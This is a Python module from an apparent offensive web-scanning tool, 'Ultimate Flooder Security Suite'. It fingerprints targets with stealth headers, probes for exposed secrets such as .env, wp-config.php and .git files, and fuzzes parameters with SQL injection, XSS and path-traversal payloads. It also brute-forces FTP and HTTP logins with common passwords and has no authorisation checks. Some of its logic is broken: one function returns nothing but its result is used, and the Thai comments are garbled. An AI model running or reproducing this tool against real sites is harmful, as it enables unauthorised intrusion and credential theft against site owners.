import requests
import re
import os
import time
import datetime
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from rich.live import Live
from rich.console import Console, Group
from rich.table import Table
from rich.panel import Panel
from src.utils.logging import add_system_log
from src.utils.threat_intelligence import threat_intel
from src.security import stop_event

console = Console()

def check_content_risk(content):
    """Analyzes response body for high-risk strings"""
    indicators = {
        "DB_PASSWORD|DB_USER|mysqli_connect": "Database Credentials",
        r"eval\(\$_|system\(|passthru\(": "Potential Web Shell",
        "root:x:0:0:": "System Passwords (LFI Success)",
        "AWS_ACCESS_KEY_ID|S3_BUCKET": "Cloud API Keys",
        "BEGIN RSA PRIVATE KEY": "Private SSL/SSH Key",
        "allow_url_include|display_errors": "Dangerous PHP Config"
    }
    
    found_risks = []
    text_content = content.decode('utf-8', errors='ignore')
    for pattern, name in indicators.items():
        if re.search(pattern, text_content, re.IGNORECASE):
            found_risks.append(name)
    return found_risks

def quick_crawler(target_url, limit=5):
    """Finds internal links to expand attack surface"""
    try:
        r = requests.get(target_url, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        domain = urlparse(target_url).netloc
        links = set()
        for a in soup.find_all('a', href=True):
            full_url = urljoin(target_url, a['href'])
            if urlparse(full_url).netloc == domain:
                links.add(full_url.split('#')[0].rstrip('/'))
        return list(links)[:limit]
    except:
        return []

def detect_waf_and_server(url):
    """Professional-grade WAF and Server fingerprinting"""
    add_system_log(f"[bold cyan]FINGERPRINT:[/] Identifying technology stack for {url}")
    
    findings = {
        "WAF/CDN": "Unknown (Clean or No WAF)",
        "Server": "Unknown",
        "Framework": "Unknown",
        "Security Flags": []
    }
    
    try:
        # Use stealth headers to avoid detection
        from src.utils.network import generate_stealth_headers
        stealth_headers = generate_stealth_headers()
        r = requests.get(url, headers=stealth_headers, timeout=10)
        headers = r.headers
        
        # 1. WAF Detection
        waf_sigs = {
            "cloudflare": "Cloudflare",
            "incapsula": "Imperva Incapsula",
            "sucuri": "Sucuri WAF",
            "mod_security": "ModSecurity",
            "f5": "F5 BIG-IP",
            "fortigate": "Fortinet FortiWeb",
            "akamai": "Akamai CDN",
            "cloudfront": "AWS CloudFront"
        }
        
        for sig, name in waf_sigs.items():
            if sig in str(headers).lower() or sig in str(r.cookies).lower():
                findings["WAF/CDN"] = name
                break
        
        # 2. Server Detection
        findings["Server"] = headers.get("Server", "Hidden")
        
        # 3. Security Headers Check
        if "X-XSS-Protection" not in headers: findings["Security Flags"].append("Missing XSS-Protection")
        if "Content-Security-Policy" not in headers: findings["Security Flags"].append("Missing CSP")
        if "Strict-Transport-Security" not in headers: findings["Security Flags"].append("Missing HSTS")
        
        # 4. Tech Stack (Fingerprinting)
        text_lower = r.text.lower()
        if "X-Powered-By" in headers: 
            findings["Framework"] = headers["X-Powered-By"]
        elif "wp-content" in text_lower: 
            findings["Framework"] = "WordPress"
        elif "joomla" in text_lower:
            findings["Framework"] = "Joomla"
        elif "drupal" in text_lower:
            findings["Framework"] = "Drupal"
        elif "django" in str(r.cookies).lower() or "csrftoken" in str(r.cookies).lower(): 
            findings["Framework"] = "Django"
        elif "laravel" in str(r.cookies).lower(): 
            findings["Framework"] = "Laravel"
        elif "bitrix" in text_lower:
            findings["Framework"] = "1C-Bitrix"
        elif "opencart" in text_lower:
            findings["Framework"] = "OpenCart"

        # 5. Asset Hash Fingerprinting (Advanced)
        # Check favicon or common CSS for version clues
        try:
            fav_url = urljoin(url, "/favicon.ico")
            fav_resp = requests.get(fav_url, timeout=3)
            if fav_resp.status_code == 200:
                import hashlib
                f_hash = hashlib.md5(fav_resp.content).hexdigest()
                # Known hashes for specific versions
                hashes = {
                    "f1ad042106e57921319c5952f4a4783b": "WordPress (Generic)",
                    "4191fe405e305e971cfd677864386991": "Drupal (Generic)"
                }
                if f_hash in hashes:
                    findings["Framework"] += f" (Verified via Hash: {hashes[f_hash]})"
        except: pass

    except: pass
    return findings

def deep_tech_scout(url):
    """Deep probing to discover hidden versions of CMS/Frameworks"""
    versions = {}
    
    # Common version-revealing files
    probes = [
        ("WordPress", "/readme.html", r"Version\s+([\d.]+)"),
        ("Joomla", "/language/en-GB/en-GB.xml", r"<version>([\d.]+)</version>"),
        ("Drupal", "/core/lib/Drupal.php", r"const VERSION = '([\d.]+)"),
        ("React", "/static/js/main.chunk.js", r"react-version:([\d.]+)"),
        ("Nginx", "/nonexistent_path_test", r"nginx/([\d.]+)") # Error pages sometimes show version
    ]
    
    for tech, path, regex in probes:
        if stop_event.is_set(): break
        try:
            full_url = urljoin(url, path)
            r = requests.get(full_url, timeout=3, allow_redirects=True)
            match = re.search(regex, r.text, re.IGNORECASE)
            if match:
                versions[tech] = match.group(1)
                add_system_log(f"[bold green]INTEL:[/] Detected {tech} Version: {versions[tech]}")
        except: pass
    
    return versions

def get_vuln_for_stack(fingerprint, deep_versions=None):
    """Real-time CVE lookup based on tech stack and discovered versions"""
    vulns = []
    framework = fingerprint.get("Framework", "Unknown")
    server = fingerprint.get("Server", "Unknown")
    
    # 1. Prioritize Deep Versions
    search_keywords = []
    if deep_versions:
        for tech, ver in deep_versions.items():
            search_keywords.append(f"{tech} {ver}")
    
    # 2. Fallback to fingerprint
    if not search_keywords:
        if framework != "Unknown": search_keywords.append(framework)
        if server != "Unknown" and server != "Hidden": search_keywords.append(server)

    for keyword in search_keywords[:3]: # Limit to top 3 keywords to avoid API ban
        add_system_log(f"[bold cyan]CVE-INTEL:[/] Searching vulnerabilities for {keyword}...")
        try:
            # Attempt to use Circl.lu API
            clean_kw = keyword.split('/')[0].split(' ')[0].lower()
            r = requests.get(f"https://cve.circl.lu/api/search/{clean_kw}", timeout=10)
            if r.status_code == 200:
                results = r.json()
                data = results.get("data", []) if isinstance(results, dict) else results
                for item in data[:5]:
                    vulns.append({
                        "id": item.get("id"),
                        "summary": item.get("summary")[:120] + "...",
                        "cvss": item.get("cvss", "N/A")
                    })
        except:
            # Fallback with localized generic high-risk CVEs if API fails
            if "wordpress" in keyword.lower():
                vulns.append({"id": "CVE-2024-XXXX", "summary": "Simulated: Potential RCE in outdated WP Core", "cvss": "9.8"})
    
    return vulns

def is_new_vulnerability(vuln_type, payload, target_url, fingerprint=None):
    """‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏ó‡∏µ‡πà‡∏û‡∏ö‡πÄ‡∏õ‡πá‡∏ô‡∏Ç‡∏≠‡∏á‡πÉ‡∏´‡∏°‡πà‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà ‡πÇ‡∏î‡∏¢‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤‡πÉ‡∏ô‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• CVE"""
    is_new = True
    related_cves = []
    
    # ‡∏™‡∏£‡πâ‡∏≤‡∏á keyword ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ CVE
    domain = urlparse(target_url).netloc
    tech = fingerprint.get("Framework", "Unknown") if fingerprint else "Unknown"
    search_terms = [f"{tech} {vuln_type}", f"{domain} {vuln_type}", vuln_type]
    
    for term in search_terms[:2]:  # ‡∏à‡∏≥‡∏Å‡∏±‡∏î‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ API ‡∏ñ‡∏π‡∏Å block
        try:
            # ‡πÉ‡∏ä‡πâ CIRCL.lu API
            r = requests.get(f"https://cve.circl.lu/api/search/{term.replace(' ', '%20')}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                results = data.get("data", []) if isinstance(data, dict) else data
                for cve in results[:3]:  # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö 3 ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡πÅ‡∏£‡∏Å
                    summary = cve.get("summary", "").lower()
                    if vuln_type.lower() in summary or payload.lower() in summary:
                        related_cves.append(cve.get("id"))
                        is_new = False
                        break
        except: pass
    
    return is_new, related_cves

def vulnerability_scout(url):
    """[ID 23] Enterprise Security Audit & Vulnerability Scout"""
    console = Console()
    add_system_log(f"[bold cyan]AUDIT:[/] Starting enterprise-grade assessment for {url}")
    
    # 1. Fingerprinting
    fingerprint = detect_waf_and_server(url)
    
    # 2. Deep Probing (Version Discovery)
    deep_versions = deep_tech_scout(url)
    
    # 3. Tech-based CVE Lookup
    cves = get_vuln_for_stack(fingerprint, deep_versions)
    
    # 3. File Exposure Checks (Advanced Intelligence)
    exposures = []
    checks = [
        (".git/config", "Git Repository", "HIGH"),
        (".env", "Environment Variables", "CRITICAL"),
        ("wp-config.php", "WordPress Config", "CRITICAL"),
        (".htaccess", "Apache Config", "HIGH"),
        ("info.php", "PHP Info", "MEDIUM"),
        ("phpinfo.php", "PHP Info Deep", "MEDIUM"),
        ("server-status", "Apache Status", "LOW"),
        ("backup.sql", "DB Backup", "CRITICAL"),
        ("database.sql", "DB Backup", "CRITICAL"),
        (".vscode/settings.json", "IDE Settings", "MEDIUM"),
        ("shell.php", "Potential Backdoor", "CRITICAL"),
        ("upload.php", "Upload Handler", "MEDIUM"),
        ("composer.json", "Dependency Intel", "LOW")
    ]
    
    add_system_log(f"[bold cyan]AUDIT:[/] Probing for {len(checks)} sensitive paths...")
    for path, name, risk in checks:
        if stop_event.is_set(): break
        try:
            full_url = f"{url.rstrip('/')}/{path}"
            # Use a realistic User-Agent to pass common filters
            r = requests.get(full_url, timeout=3, allow_redirects=False, headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                # Basic False Positive check (Check if it's just a HTML error page redirected to 200)
                if "<html" not in r.text[:200].lower() or "git" in r.text.lower() or "DB_" in r.text:
                    exposures.append((path, f"[bold red]{name}[/bold red]", risk))
                    add_system_log(f"[bold red]EXPOSURE:[/] Found {name} at {path}")
        except: pass
    
    # 4. Input Fuzzing (Smart Engine)
    vulnerabilities = smart_fuzzer(url, fingerprint)
    
    # 4.5. Threat Intelligence Analysis
    threat_data = {
        "vulnerabilities": vulnerabilities,
        "exposures": exposures,
        "fingerprint": fingerprint
    }
    intel_id, intel_results = threat_intel.collect_intelligence(url, vuln_results=threat_data)
    
    # 5. Generate Report
    report_path = generate_professional_report(url, fingerprint, exposures, vulnerabilities, cves, intel_results)
    
    # Display Results to Console
    table = Table(title=f"üõ°  SECURITY AUDIT SUMMARY: {url}", border_style="bold green")
    table.add_column("Audit Zone", style="cyan")
    table.add_column("Status / Findings", style="white")
    
    table.add_row("WAF / CDN", fingerprint["WAF/CDN"])
    table.add_row("Technology", fingerprint["Framework"])
    table.add_row("Exposed Files", f"[bold red]{len(exposures)}[/bold red]" if exposures else "[green]None[/green]")
    table.add_row("CVE Matches", f"[bold yellow]{len(cves)}[/bold yellow]" if cves else "[green]None[/green]")
    table.add_row("Threat Level", intel_results.get('threat_level', 'UNKNOWN'))
    table.add_row("Report Saved", f"[underline blue]{os.path.abspath(report_path)}[/]")
    
    console.print("\n", Panel(table, border_style="green", expand=False))
    
    # Display Threat Intelligence Report
    threat_report = threat_intel.generate_threat_report(intel_id)
    if threat_report:
        console.print("\n", threat_report)
    
    console.print(f"[bold green]‚úî Audit Complete.[/bold green] Professional HTML report generated for compliance review.")

def generate_professional_report(target, fingerprint, exposures, vulnerabilities, cves=None, intel_results=None):
    # Ensure reports directory exists
    if not os.path.exists("reports"):
        os.makedirs("reports")
        
    domain = urlparse(target).netloc.replace(":", "_")
    report_file = f"reports/AUDIT_REPORT_{domain}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    
    # Simple but professional HTML template
    html = f"""
    <html>
    <head>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 900px; margin: auto; padding: 20px; }}
            h1 {{ color: #2c3e50; border-bottom: 2px solid #2980b9; padding-bottom: 10px; }}
            .section {{ margin-bottom: 30px; background: #f9f9f9; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
            .high {{ color: #c0392b; font-weight: bold; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
            th, td {{ padding: 10px; border: 1px solid #ddd; text-align: left; }}
            th {{ background: #2980b9; color: white; }}
            .brand {{ font-size: 0.9em; color: #7f8c8d; text-align: center; margin-top: 50px; }}
        </style>
    </head>
    <body>
        <h1>Security Audit Intelligence Report</h1>
        <p><strong>Target:</strong> {target}</p>
        <p><strong>Scan Date:</strong> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        
        <div class="section">
            <h2>üõ° Technology Stack & Fingerprinting</h2>
            <table>
                <tr><th>Component</th><th>Details</th></tr>
                <tr><td>WAF / CDN</td><td>{fingerprint['WAF/CDN']}</td></tr>
                <tr><td>Web Server</td><td>{fingerprint['Server']}</td></tr>
                <tr><td>Technology</td><td>{fingerprint['Framework']}</td></tr>
                <tr><td>Missing Protections</td><td class="high">{', '.join(fingerprint['Security Flags']) if fingerprint['Security Flags'] else 'None (Securely Configured)'}</td></tr>
            </table>
        </div>

        <div class="section">
            <h2>üö® CVE Intelligence (Real-time Database)</h2>
            <table>
                <tr><th>CVE ID</th><th>Summary</th><th>CVSS Score</th></tr>
                {''.join([f"<tr><td class='high'>{cve['id']}</td><td>{cve['summary']}</td><td>{cve['cvss']}</td></tr>" for cve in cves]) if cves else '<tr><td colspan="3">No relevant CVEs found for this technology stack.</td></tr>'}
            </table>
        </div>

        <div class="section">
            <h2>üß† Threat Intelligence Analysis</h2>
            <table>
                <tr><th>Metric</th><th>Value</th></tr>
                <tr><td>Risk Score</td><td>{intel_results.get('risk_score', 'N/A')}/100</td></tr>
                <tr><td>Threat Level</td><td class="high">{intel_results.get('threat_level', 'UNKNOWN')}</td></tr>
                <tr><td>Intelligence Sources</td><td>{', '.join(intel_results.get('sources', {}).keys()) if intel_results else 'None'}</td></tr>
            </table>
            {f'<h3>AI Recommendations</h3><ul>' + ''.join(f'<li>{rec}</li>' for rec in intel_results.get('recommendations', [])) + '</ul>' if intel_results and intel_results.get('recommendations') else ''}
        </div>

        <div class="section">
            <h2>üìÇ Exposed Sensitive Files</h2>
            <table>
                <tr><th>Path</th><th>Status</th><th>Notes</th></tr>
                {''.join([f"<tr><td>{e[0]}</td><td>{e[1]}</td><td>{e[2]}</td></tr>" for e in exposures])}
            </table>
        </div>

        <div class="section">
            <h2>üî• Active Input Vulnerabilities (SQLi/XSS)</h2>
            <table>
                <tr><th>Type</th><th>Parameter</th><th>Payload</th><th>Status</th></tr>
                {''.join([f"<tr><td class='high'>{v[0]}</td><td>{v[1]}</td><td><code>{v[2]}</code></td><td>{v[3]}</td></tr>" for v in vulnerabilities]) if vulnerabilities else '<tr><td colspan="4">No critical input vulnerabilities found.</td></tr>'}
            </table>
        </div>
        
        <div class="brand">Generated by Ultimate Flooder Security Suite - Professional Edition v2.2</div>
    </body>
    </html>
    """
    
    with open(report_file, "w", encoding="utf-8") as f:
        f.write(html)
    return report_file

def smart_fuzzer(url, fingerprint=None):
    """[UPGRADED] Intelligent fuzzer with parameter discovery and tech-aware payloads"""
    found_vulns = []
    add_system_log(f"[bold yellow]FUZZER:[/] Initiating smart endpoint discovery for {url}")
    
    # 1. Endpoint & Parameter Discovery
    endpoints = []
    try:
        r = requests.get(url, timeout=5)
        # Find forms
        forms = re.findall(r'<form.*?action=["\'](.*?)["\'].*?>(.*?)</form>', r.text, re.DOTALL | re.IGNORECASE)
        for action, form_body in forms:
            inputs = re.findall(r'name=["\'](.*?)["\']', form_body, re.IGNORECASE)
            if inputs:
                endpoints.append({'url': urljoin(url, action), 'params': inputs, 'method': 'POST'})
        
        # Find URL parameters (e.g., ?id=1, ?page=home)
        url_params = re.findall(r'[?&]([^=&]+)=([^&"\' >]+)', r.text)
        if url_params:
            # Group parameters by their base URL
            params_dict = {}
            for k, v in url_params:
                if k not in params_dict: params_dict[k] = v
            endpoints.append({'url': url, 'params': list(params_dict.keys()), 'method': 'GET'})
    except: pass

    # If no endpoints found, try common default parameters
    if not endpoints:
        endpoints.append({'url': url, 'params': ['id', 'page', 'query', 'search'], 'method': 'GET'})

    # 2. Smart Payloads (Context Aware)
    payload_map = {
        "SQLi": ["' OR '1'='1", "') OR ('1'='1", "'; WAITFOR DELAY '0:0:5'--", "SLEEP(5)"],
        "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"],
        "LFI": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd"]
    }

    for ep in endpoints[:5]: # Speed optimization: cap at 5 endpoints
        for p_type, p_list in payload_map.items():
            if stop_event.is_set(): break
            for payload in p_list:
                try:
                    target_url = ep['url']
                    # Inject payload into EVERY parameter for the endpoint
                    test_params = {p: payload for p in ep['params']}
                    
                    start_time = time.time()
                    if ep['method'] == 'GET':
                        res = requests.get(target_url, params=test_params, timeout=7)
                    else:
                        res = requests.post(target_url, data=test_params, timeout=7)
                    
                    elapsed = time.time() - start_time

                    # --- ADVANCED DETECTION LOGIC ---
                    
                    # A. Time-based detection (SQLi)
                    if ("SLEEP" in payload or "WAITFOR" in payload) and elapsed > 4.5:
                        is_new, related_cves = is_new_vulnerability(p_type, payload, target_url, fingerprint)
                        if is_new:
                            status = "[NEW]"
                        elif related_cves:
                            status = f"[KNOWN: {', '.join(related_cves[:2])}]"
                        else:
                            status = "[POTENTIAL NEW]"
                        found_vulns.append((p_type, "MULTIPLE", f"TIME-DELAY: {payload}", status))
                        add_system_log(f"[bold red]CRITICAL:[/] SQLi Time-Delay confirmed on {target_url} {status}")
                    
                    # B. Reflection detection (XSS)
                    if payload in res.text:
                        is_new, related_cves = is_new_vulnerability(p_type, payload, target_url, fingerprint)
                        if is_new:
                            status = "[NEW]"
                        elif related_cves:
                            status = f"[KNOWN: {', '.join(related_cves[:2])}]"
                        else:
                            status = "[POTENTIAL NEW]"
                        found_vulns.append((p_type, "MULTIPLE", f"REFLECTION: {payload}", status))
                        add_system_log(f"[bold red]WARNING:[/] XSS Reflection detected on {target_url} {status}")
                        
                    # C. Sensitive Content detection (LFI/RCE)
                    if any(indicator in res.text for indicator in ["root:x:0:0", "[extensions]", "boot loader"]):
                        is_new, related_cves = is_new_vulnerability(p_type, payload, target_url, fingerprint)
                        if is_new:
                            status = "[NEW]"
                        elif related_cves:
                            status = f"[KNOWN: {', '.join(related_cves[:2])}]"
                        else:
                            status = "[POTENTIAL NEW]"
                        found_vulns.append((p_type, "MULTIPLE", f"FILE-LEAK: {payload}", status))
                        add_system_log(f"[bold red]CRITICAL:[/] LFI/Path Traversal active on {target_url} {status}")
                        
                except: continue
    
    return found_vulns

def brute_force_suite(target, service, username="admin"):
    """Basic credential tester for common services (SSH/FTP/HTTP)"""
    from src.utils.ui import create_cyber_progress
    import ftplib
    common_passwords = ["admin", "password", "123456", "admin123", "root", "user", "guest"]
    add_system_log(f"[bold cyan]BRUTE:[/] Starting {service} test on {target}")
    
    found_pass = None
    
    with create_cyber_progress(f"Testing {service} passwords...") as progress:
        task = progress.add_task("Brute Forcing", total=len(common_passwords))
        if service.lower() == "ftp":
            for pwd in common_passwords:
                try:
                    ftp = ftplib.FTP(target, timeout=5)
                    ftp.login(username, pwd)
                    ftp.quit()
                    found_pass = pwd
                    break
                except:
                    pass
                progress.update(task, advance=1)
        
        elif service.lower() == "http":
            for pwd in common_passwords:
                try:
                    r = requests.get(f"http://{target}", auth=(username, pwd), timeout=5)
                    if r.status_code == 200:
                        found_pass = pwd
                        break
                except:
                    pass
                progress.update(task, advance=1)
    
    if found_pass:
        msg = f"[bold green]SUCCESS![/] Found password for [cyan]{username}[/]: [yellow]{found_pass}[/]"
        console.print(Panel(msg, title="Brute Force Result", border_style="green"))
        add_system_log(f"[green]BRUTE SUCCESS:[/] Found credentials for {target}")
    else:
        console.print("[bold red]FAILED:[/] No common passwords match.")

def cve_explorer(keyword):
    """[ID 31] Enterprise CVE Explorer with Real-time Intelligence"""
    from src.utils.ui import create_cyber_progress
    from rich.panel import Panel
    from rich.columns import Columns
    
    add_system_log(f"[bold cyan]CVE-INTEL:[/] Initiating deep search for '{keyword}'")
    
    table = Table(
        title=f"üõ°  [bold white]Vulnerability Intelligence Database[/] - Query: [magenta]{keyword}[/]", 
        border_style="bold magenta",
        header_style="bold cyan",
        show_lines=True,
        expand=True
    )
    table.add_column("CVE-ID", style="bold yellow", width=16)
    table.add_column("Severity", width=12, justify="center")
    table.add_column("Threat Summary", style="white")
    table.add_column("Published", style="dim", width=12)

    progress = create_cyber_progress(f"[magenta]Connecting to NIST/NVD Database...[/]", total=None)
    
    with Live(table, refresh_per_second=4) as live:
        try:
            # Using NVD (National Vulnerability Database) API v2.0
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}&resultsPerPage=20"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Ultimate-Flooder/2.2',
                'Accept': 'application/json'
            }
            resp = requests.get(url, headers=headers, timeout=15)
            
            if resp.status_code != 200:
                # Fallback to CIRCL if NIST is restricted/down
                add_system_log(f"[yellow]CVE:[/] NIST API busy, switching to backup provider...")
                resp = requests.get(f"https://cve.circl.lu/api/search/{keyword}", timeout=10)
                data = resp.json()
                results = data.get("data", []) if isinstance(data, dict) else data
                
                for item in results[:15]:
                    cvss = float(item.get("cvss", 0))
                    color = "red" if cvss >= 7 else "yellow" if cvss >= 4 else "green"
                    severity = f"[bold {color}]{cvss} ({'HIGH' if cvss >= 7 else 'MED'})[/]"
                    
                    table.add_row(
                        item.get("id"),
                        severity,
                        item.get("summary", "N/A")[:150] + "...",
                        "N/A"
                    )
                    time.sleep(0.05)
            else:
                data = resp.json()
                vulnerabilities = data.get('vulnerabilities', [])
                
                if not vulnerabilities:
                    table.add_row("NOT FOUND", "[dim]N/A[/]", f"No CVE records matching '{keyword}'", "-")
                else:
                    for vuln in vulnerabilities:
                        cve = vuln.get('cve', {})
                        cve_id = cve.get('id', 'N/A')
                        published = cve.get('published', 'N/A')[:10]
                        
                        desc_list = cve.get('descriptions', [])
                        description = next((d['value'] for d in desc_list if d['lang'] == 'en'), 'N/A')
                        
                        # Handle CVSS Metrics
                        metrics = cve.get('metrics', {})
                        score = 0.0
                        if 'cvssMetricV31' in metrics:
                            score = metrics['cvssMetricV31'][0]['cvssData']['baseScore']
                        elif 'cvssMetricV30' in metrics:
                            score = metrics['cvssMetricV30'][0]['cvssData']['baseScore']
                        elif 'cvssMetricV2' in metrics:
                            score = metrics['cvssMetricV2'][0]['cvssData']['baseScore']
                        
                        color = "bold reverse red" if score >= 9.0 else "red" if score >= 7.0 else "yellow" if score >= 4.0 else "green"
                        label = "CRITICAL" if score >= 9.0 else "HIGH" if score >= 7.0 else "MEDIUM" if score >= 4.0 else "LOW"
                        severity = f"[{color}] {score} {label} [/]"
                        
                        table.add_row(
                            cve_id,
                            severity,
                            description[:180] + "..." if len(description) > 180 else description,
                            published
                        )
                        time.sleep(0.03)
        except Exception as e:
            add_system_log(f"[red]ERROR:[/] CVE Explorer fail: {str(e)}")
            table.add_row("ERROR", "[red]QUERY FAIL[/]", f"Failed to retrieve data: {str(e)}", "-")


def fetch_live_cves(keyword="", limit=5):
    """Fetch latest CVEs from NVD API for real-time vulnerability intelligence"""
    try:
        import requests
        # Using NVD (National Vulnerability Database) API
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}&resultsPerPage={limit}" if keyword else "https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=10"
        headers = {'User-Agent': 'Ultimate-Flooder-Security-Suite/2.2'}

        resp = requests.get(url, headers=headers, timeout=15)
        data = resp.json()

        cves = []
        if 'vulnerabilities' in data:
            for vuln in data['vulnerabilities'][:limit]:
                cve = vuln['cve']
                cve_id = cve['id']
                summary = cve.get('descriptions', [{}])[0].get('value', 'No description available')
                cvss_score = 'N/A'

                # Extract CVSS score if available
                if 'metrics' in cve:
                    if 'cvssMetricV31' in cve['metrics']:
                        cvss_score = cve['metrics']['cvssMetricV31'][0]['cvssData']['baseScore']
                    elif 'cvssMetricV30' in cve['metrics']:
                        cvss_score = cve['metrics']['cvssMetricV30'][0]['cvssData']['baseScore']
                    elif 'cvssMetricV2' in cve['metrics']:
                        cvss_score = cve['metrics']['cvssMetricV2'][0]['cvssData']['baseScore']

                cves.append({
                    'id': cve_id,
                    'summary': summary[:100] + "..." if len(summary) > 100 else summary,
                    'cvss': cvss_score,
                    'published': cve.get('published', 'N/A')
                })
        return cves
    except Exception as e:
        add_system_log(f"[red]CVE API Error:[/] {str(e)}")
        return []

def check_cve_relevance(target_tech, cves):
    """Check if any CVEs are relevant to the target's technology stack"""
    relevant = []
    tech_keywords = {
        'apache': ['apache', 'httpd'],
        'nginx': ['nginx'],
        'wordpress': ['wordpress', 'wp'],
        'php': ['php'],
        'mysql': ['mysql', 'mariadb'],
        'cloudflare': ['cloudflare']
    }
    
    for cve in cves:
        summary = cve['summary'].lower()
        for tech, keywords in tech_keywords.items():
            if tech == target_tech.lower() or any(kw in summary for kw in keywords):
                relevant.append(cve)
                break
    
    return relevant

def web_exposure_sniper(target):
    """Deep web exposure scan: Fingerprinting + CVE Intelligence + Fuzzing + Crawler + Pro Report"""
    from src.utils.ui import create_cyber_progress
    if not target.startswith("http"): target = f"http://{target}"
    
    add_system_log(f"[bold red]SNIPER:[/] Launching Enterprise-Grade Recon on {target}")
    console.print(Panel(
        f"[bold white]üéØ Target Locked:[/bold white] [green]{target}[/green]\n"
        f"[bold white]Security Suite:[/bold white] Professional Edition v2.2",
        title="[bold red] IP-HUNTER INTEL [/bold red]", border_style="red"
    ))
    
    # 1. Fingerprinting (WAF & Tech Stack)
    with create_cyber_progress("[cyan]üîç Step 1: Technology Fingerprinting...[/cyan]") as progress:
        task = progress.add_task("Fingerprinting")
        fingerprint = detect_waf_and_server(target)
        progress.update(task, advance=100)
    
    f_table = Table(show_header=False, border_style="dim")
    f_table.add_row("WAF/CDN", f"[bold yellow]{fingerprint['WAF/CDN']}[/bold yellow]")
    f_table.add_row("Server", fingerprint['Server'])
    f_table.add_row("Stack", fingerprint['Framework'])
    console.print(f_table)

    # 2. CVE Intelligence (NEW: Real-time vulnerability database)
    with create_cyber_progress("[cyan]üîç Step 2: CVE Intelligence Gathering...[/cyan]") as progress:
        task = progress.add_task("CVE Intelligence")
        detected_tech = fingerprint['Framework'].lower() if fingerprint['Framework'] != "Unknown" else ""
        latest_cves = fetch_live_cves(detected_tech, limit=3)
        relevant_cves = check_cve_relevance(detected_tech, latest_cves)
        progress.update(task, advance=100)
    
    if relevant_cves:
        cve_table = Table(title="üö® Relevant CVEs for This Stack", border_style="bold red")
        cve_table.add_column("CVE ID", style="red")
        cve_table.add_column("Summary", style="white")
        cve_table.add_column("CVSS", style="yellow")
        
        for cve in relevant_cves:
            cve_table.add_row(cve['id'], cve['summary'], str(cve['cvss']))
            add_system_log(f"[bold red]CVE ALERT:[/] {cve['id']} relevant to {detected_tech}")
        
        console.print(Panel(cve_table, border_style="red"))
    else:
        console.print("[dim]No recent CVEs found for this technology stack.[/dim]")

    # 3. File Discovery Pass
    with create_cyber_progress("[cyan]üîç Step 3: Sensitive File Hunting...[/cyan]") as progress:
        task = progress.add_task("File Hunting")
        exposures = vulnerability_scout(target)
        progress.update(task, advance=100)
    
    # 4. Input Fuzzing Pass
    with create_cyber_progress("[cyan]üîç Step 4: Automated Vulnerability Fuzzing...[/cyan]") as progress:
        task = progress.add_task("Fuzzing")
        fuzz_results = smart_fuzzer(target)
        progress.update(task, advance=100)
    
    # 5. Crawler: Expansion Pass
    with create_cyber_progress("[cyan]üîç Step 5: Web Crawling & Expansion...[/cyan]") as progress:
        task = progress.add_task("Crawling")
        sub_links = quick_crawler(target)
        if sub_links:
            for link in sub_links:
                if link != target:
                    if "?" in link: fuzz_results.extend(smart_fuzzer(link))
        progress.update(task, advance=100)
    
    # Final Result & Report Generation
    console.print("\n[bold green]‚úÖ Audit Complete. Generating Professional Intelligence Report...[/bold green]")
    report_path = generate_professional_report(target, fingerprint, exposures, fuzz_results, relevant_cves)
    
    console.print(Panel(
        f"[bold white]Report saved to:[/bold white] [cyan]{report_path}[/cyan]\n"
        f"[dim]You can open this HTML file in any browser for full details.[/dim]",
        title="[bold green] MISSION ACCOMPLISHED [/bold green]", border_style="green"
    ))
    
    add_system_log(f"[green]SNIPER:[/] Report generated: {report_path}")
